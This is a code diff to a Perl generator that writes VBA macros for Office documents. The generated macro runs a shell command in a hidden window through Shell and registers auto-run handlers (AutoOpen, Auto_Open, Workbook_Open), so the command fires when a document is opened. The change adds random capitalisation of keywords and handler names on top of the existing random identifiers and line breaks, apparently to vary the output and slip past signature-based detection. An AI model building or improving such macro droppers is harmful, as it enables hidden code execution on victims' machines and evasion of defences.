@@ -391,16 +391,29 @@ sub gen_code {
         if ( $stype eq 2 ) {
 
                 my $vbaSh = rstr();
+                my $rvbaCaps = int(rand(2));
 
                 print $fh "\n\n", $vbaSh . ' = '. 'Shell(' . $rcmdvar . ',' . ' 0' . ')';
+
                 if ( $nline == 3 ) { print $fh "\n"; }
-                print $fh "\n", 'End Sub';
+
+                if ( $rvbaCaps == 0 ) { print $fh "\n end sub\n"; }
+                else { print $fh "\n", 'end Sub'; }
+
                 if ( $nline == 1 ) { print $fh "\n"; }
-                print $fh "\n", 'Sub AutoOpen(): ' . $rsub . ': End Sub';
+
+                if ( $rvbaCaps == 1 ) { print $fh "\n", 'sub AutoOpen(): ' . $rsub . ': End sub'; }
+                else { print $fh "\n", 'Sub AutoOpen(): ' . $rsub . ': end Sub', "\n"; }
+
                 if ( $nline == 0 ) { print $fh "\n"; }
-                print $fh "\n", 'Sub Auto_Open(): ' . $rsub . ': End Sub';
+
+                if ( $rvbaCaps == 0 ) { print $fh "\n", 'sub Auto_open(): ' . $rsub . ": end Sub\n"; }
+                else { print $fh "\n", 'sub auto_Open(): ' . $rsub . ': End sub'; }
+
                 if ( $nline == 2 ) { print $fh "\n"; }
-                print $fh "\n", 'Sub Workbook_Open(): ' . $rsub . ': End Sub';
+
+                if ( $rvbaCaps == 1 ) { print $fh "\n", 'Sub workbook_Open(): ' . $rsub . ': End sub'; }
+                else { print $fh "\n", 'sub Workbook_open(): ' . $rsub . ": end Sub\n"; }
 
         }
 
